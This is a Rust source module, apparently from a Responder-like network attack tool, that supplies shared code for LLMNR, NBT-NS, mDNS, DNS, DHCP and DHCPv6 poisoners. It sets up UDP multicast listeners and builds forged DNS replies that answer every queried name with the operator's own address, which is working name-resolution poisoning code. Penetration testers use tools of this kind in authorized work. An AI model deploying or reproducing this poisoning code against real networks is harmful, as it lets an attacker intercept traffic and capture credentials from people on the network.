//! Name-resolution poisoners (LLMNR, NBT-NS, mDNS) plus the rogue DNS/DHCP/DHCPv6 services.
//!
//! All poisoners run as tokio UDP tasks. LLMNR/mDNS/DNS share a DNS-message codec via
//! `hickory-proto`; NBT-NS and DHCP have hand-rolled encoders.

pub mod dhcp;
pub mod dhcpv6;
pub mod dns;
pub mod llmnr;
pub mod mdns;
pub mod nbtns;

use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};

use hickory_proto::op::{Message, MessageType, ResponseCode};
use hickory_proto::rr::rdata::{A, AAAA};
use hickory_proto::rr::{Name, RData, Record, RecordType};
use socket2::{Domain, Protocol as SockProtocol, Socket, Type};

use crate::capture::model::{PoisonedQuery, Protocol, Ttl};

/// Shared poisoner options.
#[derive(Clone, Debug)]
pub struct PoisonConfig {
    /// IPv4 address we claim to be.
    pub answer_ipv4: Ipv4Addr,
    /// IPv6 address we claim to be (optional).
    pub answer_ipv6: Option<Ipv6Addr>,
    pub ttl: Ttl,
    /// Override for the name we claim (`-N`).
    pub answer_name: Option<String>,
    /// Analyze-only mode: observe but never respond.
    pub analyze: bool,
    /// Domain filter for DNS/DHCPv6 `.local` style poisoning (empty = answer everything).
    pub domains: Vec<String>,
}

impl PoisonConfig {
    pub fn new(answer_ipv4: Ipv4Addr) -> Self {
        PoisonConfig {
            answer_ipv4,
            answer_ipv6: None,
            ttl: Ttl::Fixed(crate::constants::DEFAULT_TTL),
            answer_name: None,
            analyze: false,
            domains: Vec::new(),
        }
    }
}

/// Create a UDP socket with optional address reuse and IPv4 multicast membership.
pub fn bind_udp(
    addr: SocketAddr,
    reuse: bool,
    join: Option<(Ipv4Addr, Ipv4Addr)>,
) -> anyhow::Result<tokio::net::UdpSocket> {
    let domain = if addr.is_ipv4() {
        Domain::IPV4
    } else {
        Domain::IPV6
    };
    let socket = Socket::new(domain, Type::DGRAM, Some(SockProtocol::UDP))?;
    if reuse {
        socket.set_reuse_address(true)?;
    }
    socket.bind(&addr.into())?;
    if let Some((group, iface)) = join {
        socket.join_multicast_v4(&group, &iface)?;
    }
    socket.set_nonblocking(true)?;
    let std_sock: std::net::UdpSocket = socket.into();
    Ok(tokio::net::UdpSocket::from_std(std_sock)?)
}

/// True when `name` is in scope for the DNS/DHCPv6 domain filter (empty filter = allow all).
pub fn domain_allowed(name: &str, domains: &[String]) -> bool {
    if domains.is_empty() {
        return true;
    }
    let lowered = name.trim_end_matches('.').to_ascii_lowercase();
    domains.iter().any(|d| {
        let d = d.trim().trim_start_matches('.').to_ascii_lowercase();
        !d.is_empty() && (lowered == d || lowered.ends_with(&format!(".{d}")))
    })
}

/// Build a DNS-format poison response for `query`.
pub fn dns_response(query: &Message, cfg: &PoisonConfig) -> Message {
    let mut resp = Message::new(
        query.metadata.id,
        MessageType::Response,
        query.metadata.op_code,
    );
    resp.metadata.recursion_desired = query.metadata.recursion_desired;
    resp.metadata.recursion_available = true;

    for q in &query.queries {
        resp.add_query(q.clone());
        let owner = match &cfg.answer_name {
            Some(n) => Name::from_utf8(n).unwrap_or_else(|_| q.name().clone()),
            None => q.name().clone(),
        };
        let ttl = cfg.ttl.resolve();
        match q.query_type() {
            RecordType::A => {
                resp.add_answer(Record::from_rdata(owner, ttl, RData::A(A(cfg.answer_ipv4))));
            }
            RecordType::AAAA => {
                if let Some(v6) = cfg.answer_ipv6 {
                    resp.add_answer(Record::from_rdata(owner, ttl, RData::AAAA(AAAA(v6))));
                }
            }
            RecordType::ANY => {
                resp.add_answer(Record::from_rdata(owner, ttl, RData::A(A(cfg.answer_ipv4))));
            }
            // For every other record type claim the name as an A record so the client resolves
            // it to us (mirrors the reference behaviour of answering A for anything).
            _ => {
                resp.add_answer(Record::from_rdata(owner, ttl, RData::A(A(cfg.answer_ipv4))));
            }
        }
    }
    resp
}

/// Construct (but do not send) the poisoned-query event for a DNS-format query.
pub fn query_event(
    protocol: Protocol,
    src: IpAddr,
    name: &str,
    rtype: &str,
    answered: bool,
    analyze: bool,
) -> PoisonedQuery {
    PoisonedQuery {
        protocol,
        client: src,
        name: name.to_string(),
        record_type: rtype.to_string(),
        timestamp: chrono::Utc::now(),
        answered,
        analysis_only: analyze,
    }
}

/// Helper: set a NXDOMAIN response when the query is filtered out.
pub fn nxdomain(query: &Message) -> Message {
    let mut resp = Message::new(
        query.metadata.id,
        MessageType::Response,
        query.metadata.op_code,
    );
    resp.metadata.response_code = ResponseCode::NXDomain;
    for q in &query.queries {
        resp.add_query(q.clone());
    }
    resp
}
